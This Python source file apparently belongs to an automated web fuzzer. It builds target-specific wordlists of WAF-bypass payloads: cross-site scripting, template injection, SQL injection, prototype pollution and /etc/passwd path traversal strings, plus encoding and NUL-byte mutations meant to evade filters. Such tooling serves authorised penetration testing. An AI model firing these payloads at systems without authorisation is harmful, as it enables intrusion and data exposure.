from __future__ import annotations

import json
import logging
import re
from typing import Any, Dict, List

from apps.backend.src.core.trilium.query import OrchestrationQueryLayer

logger = logging.getLogger(__name__)

class WordlistPreProcessor:
    """
    K1 Stage 16: Intelligent Wordlist Pre-Processor.
    Generates tech-aware, mutated wordlists for the Ralph Wiggum Fuzzer.
    """

    # Tech-specific bypass patterns
    BYPASS_TEMPLATES = {
        "cloudflare": [
            "<svg/onload='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "{{constructor.constructor('alert(1)')()}}",
            "/%2e%2e/%2e%2e/etc/passwd"
        ],
        "akamai": [
            "__proto__[vulnerable]=polluted",
            "<details/open/ontoggle=alert(1)>",
            "WAITFOR DELAY '0:0:5'"
        ],
        "apache": [
            "%%2e%2e%2f%%2e%2e%2fetc/passwd",
            "/.htaccess.aspx",
            "/cgi-bin/config.exp"
        ],
        "generic": [
            "' OR 1=1--",
            "<script>alert(document.domain)</script>",
            "{{7*7}}"
        ]
    }

    def __init__(self, query_layer: OrchestrationQueryLayer):
        self.query_layer = query_layer

    async def generate_payloads(self, target_note_id: str) -> List[str]:
        """
        Retrieves target context and generates a prioritized, mutated wordlist.
        """
        logger.info(f"Pre-Processor: Generating payloads for {target_note_id}")
        
        # 1. Get technical context (Tech stack, WAF status)
        context = await self.query_layer.get_target_context(target_note_id)
        tech_stack = context.get("labels", {}).get("tech_stack", "").lower()
        waf_name = context.get("labels", {}).get("waf_name", "generic").lower()

        # 2. Select base templates
        payloads = self.BYPASS_TEMPLATES.get("generic", []).copy()
        
        # Add tech-specific payloads
        for tech, patterns in self.BYPASS_TEMPLATES.items():
            if tech in tech_stack or tech in waf_name:
                logger.info(f"Pre-Processor: Target identified as using {tech}. Adding specific patterns.")
                payloads.extend(patterns)

        # 3. Apply 'Ralph-style' mutations (Double encoding, NUL bytes)
        final_list = self._apply_sovereign_mutations(payloads)
        
        logger.info(f"Pre-Processor: Final wordlist size: {len(final_list)}")
        return final_list

    def _apply_sovereign_mutations(self, payloads: List[str]) -> List[str]:
        """Applies advanced mutation techniques to the base wordlist."""
        mutated = []
        for p in payloads:
            mutated.append(p) # Original
            mutated.append(p.replace("/", "%2f")) # Basic encoding
            mutated.append(p.replace("<", "%3c").replace(">", "%3e")) # Tag encoding
            if "'" in p:
                mutated.append(p.replace("'", "''")) # SQL double-quote
            
            # High-entropy mutation: Add NUL byte
            mutated.append(f"{p}%00")
            
        return list(set(mutated)) # Deduplicate
